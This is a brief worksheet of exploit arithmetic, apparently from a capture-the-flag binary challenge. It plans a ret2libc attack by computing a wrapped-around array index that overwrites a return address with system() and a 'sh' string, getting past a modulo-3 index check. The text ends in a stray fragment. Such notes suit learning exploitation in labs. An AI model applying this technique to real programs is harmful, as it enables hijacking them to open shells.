0x080482e5 -> "sh" 
0xf7e6aed0 -> system()
0xffffd544 -> stack array
0xffffd70c -> return address

<!-- 4159090384 = 0xf7e6aed0 write into return address -->
<!-- 134513381 == 0x080482e5 write into return address + 8 -->


0xffffd70c - 0xffffd544 == 456
456 / 4 = 114
114 % 3 == 0 -> we can't use this index

0xffffffff - 0xffffd544 == 10939
10939 + 1 + 0xffffd70c == 4294967752
4294967752 / 4  == 1073741938

0xffffd544 + 1073741938 == 0xffffd70c !!!

464/ 